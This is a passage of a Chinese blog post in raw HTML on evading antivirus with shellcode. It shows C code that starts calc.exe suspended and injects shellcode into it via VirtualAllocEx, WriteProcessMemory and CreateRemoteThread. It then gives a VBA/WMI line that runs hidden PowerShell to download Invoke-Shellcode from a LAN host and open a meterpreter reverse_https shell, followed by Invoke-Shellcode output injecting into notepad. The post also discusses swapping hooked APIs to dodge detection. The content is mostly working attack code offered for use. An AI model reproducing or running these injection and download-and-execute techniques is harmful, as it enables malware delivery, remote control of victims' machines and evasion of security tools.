!important;border-color: initial !important;"><span class="code-snippet_outer">        PROCESS_INFORMATION pi;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        LPVOID lpMalwareBaseAddr;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        LPVOID lpnewVictimBaseAddr;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        HANDLE hThread;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        DWORD dwExitCode;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        BOOL bRet = FALSE;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        lpMalwareBaseAddr = shellcode;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(0, 134, 179);">GetSystemDirectory</span>(<span style="color: rgb(0, 134, 179);">Cappname</span>, MAX_PATH);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        _tcscat(<span style="color: rgb(0, 134, 179);">Cappname</span>, L<span style="color: rgb(24, 54, 145);">"\\calc.exe"</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        printf(<span style="color: rgb(24, 54, 145);">"Injection program Name:%S\r\n"</span>, <span style="color: rgb(0, 134, 179);">Cappname</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(0, 134, 179);">ZeroMemory</span>(&amp;si, <span style="color: rgb(167, 29, 93);">sizeof</span>(si));</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        si.cb = <span style="color: rgb(167, 29, 93);">sizeof</span>(si);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(0, 134, 179);">ZeroMemory</span>(&amp;pi, <span style="color: rgb(167, 29, 93);">sizeof</span>(pi));</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">if</span> (<span style="color: rgb(0, 134, 179);">CreateProcess</span>(<span style="color: rgb(0, 134, 179);">Cappname</span>, NULL, NULL, NULL,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            FALSE, CREATE_SUSPENDED</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            , NULL, NULL, &amp;si, &amp;pi) == <span style="color: rgb(0, 134, 179);">0</span>)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">return</span> bRet;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        lpnewVictimBaseAddr = <span style="color: rgb(0, 134, 179);">VirtualAllocEx</span>(pi.hProcess</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            , NULL, <span style="color: rgb(167, 29, 93);">sizeof</span>(shellcode) + <span style="color: rgb(0, 134, 179);">1</span>, MEM_COMMIT | MEM_RESERVE,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            PAGE_EXECUTE_READWRITE);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">if</span> (lpnewVictimBaseAddr == NULL)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">return</span> bRet;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(0, 134, 179);">WriteProcessMemory</span>(pi.hProcess, lpnewVictimBaseAddr,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            (LPVOID)lpMalwareBaseAddr, <span style="color: rgb(167, 29, 93);">sizeof</span>(shellcode) + <span style="color: rgb(0, 134, 179);">1</span>, NULL);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        hThread = <span style="color: rgb(0, 134, 179);">CreateRemoteThread</span>(pi.hProcess, <span style="color: rgb(0, 134, 179);">0</span>, <span style="color: rgb(0, 134, 179);">0</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            (LPTHREAD_START_ROUTINE)lpnewVictimBaseAddr, NULL, <span style="color: rgb(0, 134, 179);">0</span>, NULL);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(0, 134, 179);">WaitForSingleObject</span>(pi.hThread, INFINITE);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(0, 134, 179);">GetExitCodeProcess</span>(pi.hProcess, &amp;dwExitCode);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(0, 134, 179);">TerminateProcess</span>(pi.hProcess, <span style="color: rgb(0, 134, 179);">0</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">return</span> bRet;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">void</span> help(<span style="color: rgb(167, 29, 93);">char</span>* proc)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        printf(<span style="color: rgb(24, 54, 145);">"%s:[-] start a process and injection shellcode to memory\r\n"</span>, proc);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">int</span> main(<span style="color: rgb(167, 29, 93);">int</span> argc, <span style="color: rgb(167, 29, 93);">char</span>* argv[])</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        help(argv[<span style="color: rgb(0, 134, 179);">0</span>]);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        injection();</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    }</span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><img data-backh="147" data-backw="319" data-ratio="0.4580718767826583" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结三/2_XCoszW09eDLX0WAxYUYxhwp8OVhFLQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkQvONWyXItsLv7Hv6nEIhwP89XCoszW09eDLX0WAxYUYxhwp8OVhFLQ/640?wx_fmt=png'" data-type="png" data-w="1753" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;" title="null"  /></p><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="97" data-backw="319" data-ratio="0.30385015608740895" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结三/3_hQdKRZUzTABTP2zMK5bJKJ4htqO4hQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkORtOWbylVKmxnCzmVLUR4sgVhQdKRZUzTABTP2zMK5bJKJ4htqO4hQ/640?wx_fmt=png'" data-type="png" data-w="961" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="204" data-backw="319" data-ratio="0.6411824668705403" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结三/4_EW4A5oG95TEMMicBuPr4Zb3xFNhuvQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkdcCicH1mJBcVa8k2lhuyoXgQ7jEW4A5oG95TEMMicBuPr4Zb3xFNhuvQ/640?wx_fmt=png'" data-type="png" data-w="981" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;"><br  /></p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">注入就举例到这里，思考下如果是hook函数的检测怎么替换呢，可以进行函数替换，比如win api中可以替换VirtuallAlloc的函数就很多：</p><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="170" data-backw="319" data-ratio="0.5323325635103926" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结三/5_XcE8QZZycM5sQhibITVGgWMM6jMcKQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAk00PnBcict4RvQQoREqmZRSjNkSXcE8QZZycM5sQhibITVGgWMM6jMcKQ/640?wx_fmt=png'" data-type="png" data-w="866" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;"><br  /></p><h1 style="margin: 2em auto 1em;padding-right: 1em;padding-left: 1em;font-weight: bold;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 15.96px;display: table;border-bottom: 2px solid rgb(0, 152, 116);">0x03 技巧组合</h1><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">上面说了一些技巧，无论是分离中加载器运行shellcode、白利用运行恶意程序，还是将shellcode编码、加密、注入，对免杀都会有一定效果，单一使用某个技巧的话或多或少会有一定的缺陷。</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">那么将各个技巧结合起来达到最好的效果是我们需要取思考的事情</p><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">举个好用的例子：</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">https:<span style="color: rgb(150, 152, 150);">//github.com/enigma0x3/Powershell-Payload-Excel-Delivery/</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这是就是使用shellcode调用graeber的VBA宏，在内存中执行powershell(可以使用编码)，达到后门持久化</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Set</span> objProcess = <span style="color: rgb(0, 134, 179);">GetObject</span>(<span style="color: rgb(24, 54, 145);">"winmgmts:\\"</span> &amp; strComputer &amp; <span style="color: rgb(24, 54, 145);">"\root\cimv2:Win32_Process"</span>)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        objProcess.<span style="color: rgb(0, 134, 179);">Create</span> <span style="color: rgb(24, 54, 145);">"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.127/Invoke-Shellcode')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.127 -Lport 1111 -Force"</span>, <span style="color: rgb(0, 134, 179);">Null</span>, objConfig, intProcessID</span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><img data-backh="140" data-backw="319" data-ratio="0.4382513661202186" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结三/6_rV35pF75JgJloEnWqA1eOc1qdGNf8w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAk7qBT8TLTdVONMez5fpibh74TfrV35pF75JgJloEnWqA1eOc1qdGNf8w/640?wx_fmt=png'" data-type="png" data-w="1830" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;" title="null"  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">C:\PS&gt; <span style="color: rgb(0, 134, 179);">Start</span>-<span style="color: rgb(0, 134, 179);">Process</span> C:\Windows\SysWOW64\notepad.exe -<span style="color: rgb(0, 134, 179);">WindowStyle</span> <span style="color: rgb(0, 134, 179);">Hidden</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">C:\PS&gt; $Proc = <span style="color: rgb(0, 134, 179);">Get</span>-<span style="color: rgb(0, 134, 179);">Process</span> notepad</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">C:\PS&gt; <span style="color: rgb(0, 134, 179);">Invoke</span>-<span style="color: rgb(0, 134, 179);">Shellcode</span> -<span style="color: rgb(0, 134, 179);">ProcessId</span> $Proc.<span style="color: rgb(0, 134, 179);">Id</span> -<span style="color: rgb(0, 134, 179);">Payload</span> windows/meterpreter/reverse_https -<span style="color: rgb(0, 134, 179);">Lhost</span> <span style="color: rgb(0, 134, 179);">192.168</span>.<span style="color: rgb(0, 134, 179);">30.129</span> -<span style="color: rgb(0, 134, 179);">Lport</span> <span style="color: rgb(0, 134, 179);">443</span> -<span style="color: rgb(0, 134, 179);">Verbose</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">VERBOSE: <span style="color: rgb(0, 134, 179);">Requesting</span> meterpreter payload <span style="color: rgb(167, 29, 93);">from</span> [url]https:<span style="color: rgb(150, 152, 150);">//192.168.30.129:443/INITM[/url]</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">VERBOSE: <span style="color: rgb(0, 134, 179);">Injecting</span> shellcode <span style="color: rgb(167, 29, 93);">into</span> PID: <span style="color: rgb(0, 134, 179);">4004</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">VERBOSE: <span style="color: rgb(0, 134, 179);">Injecting</span> <span style="color: rgb(167, 29, 93);">into</span> a <span style="color: rgb(0, 134, 179);">Wow64</span> process.</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">VERBOSE: <span style="color: rgb(0, 134, 179);">Using</span> <span style="color: rgb(0, 134, 179);">32</span>-bit shellcode.</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">VERBOSE: <span style="color: rgb(0, 134, 179);">Shellcode</span> memory reserved at <span style="color: rgb(0, 134, 179);">0x03BE0000</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">VERBOSE: <span style="color: rgb(0, 134, 179);">Emitting</span> <span style="color: rgb(0, 134, 179);">32</span>-bit assembly call stub.</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">VERBOSE: <span style="color: rgb(0, 134, 179);">Thread</span> call stub memory reserved at <span style="color: rgb(0, 134, 179);">0x001B0000</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">VERBOSE: <span style="color: rgb(0, 134, 179);">Shellcode</span> injection complete!</span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei 